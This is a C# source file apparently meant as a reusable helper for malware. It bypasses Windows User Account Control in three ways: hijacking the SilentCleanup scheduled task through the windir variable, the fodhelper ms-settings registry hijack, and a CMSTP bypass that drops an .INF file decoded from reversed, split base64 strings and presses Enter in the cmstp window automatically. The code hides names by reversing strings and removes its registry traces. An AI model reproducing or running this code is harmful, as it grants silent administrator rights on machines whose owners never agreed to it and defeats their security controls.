using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UacHelper
{
    public class WinDirSluiHelper
    {

        /// <summary>
        /// Executes a command by running a specified file and sending input to it.
        /// </summary>
        /// <param name="CommandToExecute">The command to be executed.</param>
        /// <returns>True if the command was successfully executed; otherwise, false.</returns>
        /// <remarks>
        /// This method decodes a base64 encoded string and reverses the path to obtain the data path.
        /// It then checks if the file exists at the data path and returns false if it does not.
        /// The method then creates an InfFile by appending the result of SetData method.
        /// It sets up the process start info with the data path and arguments, and starts the process.
        /// It then sets the window handle to a non-zero value by repeatedly calling SetWindowActive with a specific parameter.
        /// Finally, it sends keys to the active window and returns true if the command was successfully executed; otherwise, false.
        /// </remarks>
        public static async Task<bool> Run(string path)
        {
            bool worked = false;

            var originalWindir = Environment.GetEnvironmentVariable("windir");

            try
            {
                Environment.SetEnvironmentVariable("windir", '"' + path + '"' + " ;#", EnvironmentVariableTarget.Process);

                var processStartInfo = new ProcessStartInfo
                {
                    FileName = "SCHTASKS.exe",
                    Arguments = @"/run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I",
                    UseShellExecute = false,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (var process = Process.Start(processStartInfo))
                {
                    while (!process.HasExited)
                        await Task.Delay(100);

                    if (process.ExitCode == 0)
                    {
                        worked = true;
                    }
                }
            }
            catch
            {
                worked = false;
            }
            finally
            {
                Environment.SetEnvironmentVariable("windir", originalWindir, EnvironmentVariableTarget.Process);
            }

            return worked;
        }

    }


    public class FodHelper 
    {

        /// <summary>
        /// Disables file system redirection for the calling thread in a 32-bit process running on a 64-bit computer.
        /// </summary>
        /// <param name="ptr">A pointer to a value that indicates the current state of file system redirection. If the function returns true, the value pointed to receives the previous state of file system redirection; if the function returns false, the value pointed to receives null.</param>
        /// <returns>True if the function succeeds; otherwise, false. To get extended error information, call GetLastError.</returns>
        /// <exception cref="System.ComponentModel.Win32Exception">Thrown when the function fails. Use the GetLastError method to retrieve the error code.</exception>
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

        /// <summary>
        /// Reverts the file system redirection for 32-bit applications running on a 64-bit operating system.
        /// </summary>
        /// <param name="ptr">A pointer to the value that indicates whether file system redirection is enabled or disabled.</param>
        /// <returns>True if the file system redirection was successfully reverted; otherwise, false.</returns>
        /// <exception cref="System.EntryPointNotFoundException">The specified entry point in the DLL was not found.</exception>
        /// <exception cref="System.DllNotFoundException">The specified DLL was not found.</exception>
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);

        /// <summary>
        /// Creates a new process and its primary thread. The new process runs in the security context of the calling process.
        /// </summary>
        /// <param name="lpApplicationName">The name of the module to be executed.</param>
        /// <param name="lpCommandLine">The command line to be executed.</param>
        /// <param name="lpProcessAttributes">A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new process object can be inherited by child processes.</param>
        /// <param name="lpThreadAttributes">A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new thread object can be inherited by child processes.</param>
        /// <param name="bInheritHandles">If this parameter is true, each inheritable handle in the calling process is inherited by the new process. If the parameter is false, the handles are not inherited.</param>
        /// <param name="dwCreationFlags">The flags that control the priority class and the creation of the process.</param>
        /// <param name="lpEnvironment">A pointer to an environment block for the new process.</param>
        /// <param name="lpCurrentDirectory">The full path to the current directory for the process.</param>
        /// <param name="lpStartupInfo">A pointer to a STARTUPINFO or STARTUPINFOEX structure.</param>
        /// <param name="lpProcessInformation">A pointer to a PROCESS_INFORMATION structure that receives identification information about the new process.</param>
        /// <returns>True if the function succeeds, false if it fails. To get extended error information, call GetLastError.</returns>
        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(
         string lpApplicationName,
         string lpCommandLine,
         IntPtr lpProcessAttributes,
         IntPtr lpThreadAttributes,
         bool bInheritHandles,
         int dwCreationFlags,
         IntPtr lpEnvironment,
         string lpCurrentDirectory,
         ref STARTUPINFO lpStartupInfo,
         ref PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        public static async Task<bool> Run(string path) 
        {
            IntPtr test = IntPtr.Zero;
            bool worked = false;
            Wow64DisableWow64FsRedirection(ref test);
            RegistryKey alwaysNotify = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            string consentPrompt = alwaysNotify.GetValue("ConsentPromptBehaviorAdmin").ToString();
            string secureDesktopPrompt = alwaysNotify.GetValue("PromptOnSecureDesktop").ToString();
            alwaysNotify.Close();

            if (consentPrompt == "2" & secureDesktopPrompt == "1")
            {
                return worked;
            }

            //Set the registry key for fodhelper
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");

            RegistryKey fodhelper = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
            fodhelper.SetValue("DelegateExecute", "");
            fodhelper.SetValue("", path);
            fodhelper.Close();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            worked = CreateProcess(
                null,
                "cmd /c start \"\" \"%windir%\\system32\\fodhelper.exe\"",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x08000000,
                IntPtr.Zero,
                null,
                ref si,
                ref pi);//make it hidden
            
            await Task.Delay(2000);
            newkey.DeleteSubKeyTree("ms-settings");
            Wow64RevertWow64FsRedirection(test);
            return worked;
        }
        
    }


    public class CmstpHelper//copy pasted from my prevoius project 
    {

        /// <summary>
        /// Encodes the input plain text into a base64 string.
        /// </summary>
        /// <param name="plainText">The plain text to be encoded.</param>
        /// <returns>The base64 encoded string of the input <paramref name="plainText"/>.</returns>
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        /// <summary>
        /// Decodes the base64 encoded data and returns the decoded string.
        /// </summary>
        /// <param name="base64EncodedData">The base64 encoded data to be decoded.</param>
        /// <returns>The decoded string from the base64 encoded data.</returns>
        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }
        // Our .INF file data!
        public static string pt1 = "NEc1RXZTVmcQ5WdStlCNoQDu9Wa0NWZTNHZuFWbt92QwVHdlNVZyBlb1JVPzRmbh1WbvNEc1RXZTVmcQ5WdSpQDzJXZzVFbsFkbvlGdjV2U0NXZER3culEdzV3Q942bpRXYulGdzVGRt9GdzV3QK0QXsxWY0NnbJRHb1FmZlR0WK0gCNUjLy0jROlEZlNmbhZHZBpQDk82ZhNWaoNGJ9Umc1RXYudWaTpQDd52bpNnclZ3W";
        public static string pt2 = "UsxWY0NnbJVGbpZ2byBlIgwiIFhVRuIzMSdUTNNEXzhGdhBFIwBXQc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90UiACLi0ETLhkIK0QXu9Wa0NWZTRUSEx0XyV2UVxGbBtlCNoQD3ACLu9Wa0NWZTRUSEx0XyV2UVxGbB1TMwATO0wCMwATO0oQDdNnclNXVsxWQu9Wa0NWZTR3clREdz5WS0NXdDtlCNoQDG9CIlhXZuAHdz12Yg0USvACbsl2arNXY0pQDF5USM9FROFUTN90QfV0QBxEUFJlCNwGbhR3culGIvRHIz5WanVmQgAXd0V2UgUmcvZWZCBib1JHIlJGIsxWa3BSZyVGSgMHZuFWbt92QgsjCN0lbvlGdjV2UzRmbh1Wbv";
        public static string pt3 = "gCNoQDi4EUWBncvdkI9UWbh50Y2NFdy9GaTpQDi4EUWBncvdkI9UWbh5UZjlmdyV2UK0QXzdmbpJHdTtlCNoQDiICIsISJy9mcyVEZlR3YlBHel5WVlICIsICa0FG";

        /// <summary>
        /// Shows or hides the specified window.
        /// </summary>
        /// <param name="hWnd">A handle to the window.</param>
        /// <param name="nCmdShow">Controls how the window is to be shown. For a list of possible values, see the ShowWindow function.</param>
        /// <returns>true if the window was previously visible, false if it was previously hidden.</returns>
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        /// <summary>
        /// Sets the foreground window to the specified window handle.
        /// </summary>
        /// <param name="hWnd">The handle to the window that should be set as the foreground window.</param>
        /// <returns>True if the function succeeds, otherwise false.</returns>
        /// <remarks>
        /// This method calls the SetForegroundWindow function in the user32.dll to set the specified window as the foreground window.
        /// If the function succeeds, it returns true; otherwise, it returns false.
        /// </remarks>
        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

        public static string path = "UGel5Cc0NXbjxlMz0WZ0NXezx1c39GZul2dcpzY";

        /// <summary>
        /// Reverses the input string and returns the result.
        /// </summary>
        /// <param name="s">The input string to be reversed.</param>
        /// <returns>The reversed string of the input <paramref name="s"/>.</returns>
        /// <remarks>
        /// This method reverses the characters in the input string <paramref name="s"/> by converting it to a character array, reversing the array, and then creating a new string from the reversed character array.
        /// </remarks>
        public static string Reverse(string s)
        {
            char[] charArray = s.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }

        /// <summary>
        /// Sets the data and returns the path of the output file.
        /// </summary>
        /// <param name="CommandToExecute">The command to be executed.</param>
        /// <returns>The path of the output file.</returns>
        /// <remarks>
        /// This method sets the data by creating a random file name and a temporary directory.
        /// It then writes the modified data to the output file and returns the path of the output file.
        /// </remarks>
        public static string SetData(string CommandToExecute)
        {
            string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
            string TemporaryDir = "C:\\" + Reverse("swodniw") + "\\" + Reverse("pmet");
            StringBuilder OutputFile = new StringBuilder();
            OutputFile.Append(TemporaryDir);
            OutputFile.Append("\\");
            OutputFile.Append(RandomFileName);
            OutputFile.Append("." + Reverse(Reverse(Reverse("ni"))) + Reverse("f"));
            string data = Reverse(pt1) + Reverse(pt3 + pt2);
            data = Base64Decode(data + "==");
            StringBuilder newInfData = new StringBuilder(data);
            var f = "MOC_ECALPER";
            f += "";
            newInfData.Replace(Reverse("ENIL_DNAM" + f), CommandToExecute);
            File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
            return OutputFile.ToString();
        }

        /// <summary>
        /// Kills all processes with the name "cmpst" (reverse of "ptsmc").
        /// </summary>
        /// <remarks>
        /// This method retrieves all processes with the name "cmpst" (reverse of "ptsmc") using Process.GetProcessesByName method.
        /// It then iterates through each process and kills it using the Kill method, followed by disposing of the process.
        /// </remarks>
        public static void Kill()
        {
            foreach (var process in Process.GetProcessesByName(Reverse("ptsmc")))
            {
                process.Kill();
                process.Dispose();
            }
        }
        public static bool Run(string CommandToExecute)
        {
            string datapath = Base64Decode(Reverse(path) + "=");
            if (!File.Exists(datapath))
            {
                return false;
            }
            StringBuilder InfFile = new StringBuilder();
            InfFile.Append(SetData(CommandToExecute));
            ProcessStartInfo startInfo = new ProcessStartInfo(datapath);
            startInfo.Arguments = "/" + Reverse("ua") + " " + InfFile.ToString();
            startInfo.UseShellExecute = false;
            Process.Start(startInfo).Dispose();

            IntPtr windowHandle = new IntPtr();
            windowHandle = IntPtr.Zero;
            do
            {
                windowHandle = SetWindowActive(Reverse("ptsmc"));
            } while (windowHandle == IntPtr.Zero);

            SendKeys.SendWait(Reverse(Reverse(Reverse(Reverse("{")))) + Reverse(Reverse("ENT")) + Reverse("}RE"));
            return true;
        }

        /// <summary>
        /// Sets the specified window associated with the given process name as the active window.
        /// </summary>
        /// <param name="ProcessName">The name of the process whose window needs to be set as active.</param>
        /// <returns>The handle of the active window associated with the specified process name. Returns IntPtr.Zero if the process is not found or if the window handle is not valid.</returns>
        /// <remarks>
        /// This method retrieves the processes with the specified name using Process.GetProcessesByName method.
        /// If no processes are found, it returns IntPtr.Zero.
        /// It then refreshes the first process in the array to update its information.
        /// The method retrieves the main window handle of the first process and sets it as the active window using SetForegroundWindow and ShowWindow methods.
        /// Finally, it disposes of all the processes in the array to release resources.
        /// </remarks>
        public static IntPtr SetWindowActive(string ProcessName)
        {
            Process[] target = Process.GetProcessesByName(ProcessName);
            if (target.Length == 0) return IntPtr.Zero;
            target[0].Refresh();
            IntPtr WindowHandle = new IntPtr();
            WindowHandle = target[0].MainWindowHandle;
            if (WindowHandle == IntPtr.Zero) return IntPtr.Zero;
            SetForegroundWindow(WindowHandle);
            ShowWindow(WindowHandle, 5);
            foreach (Process process in target) 
            { 
                process.Dispose();
            }
            return WindowHandle;
        }
    }

}
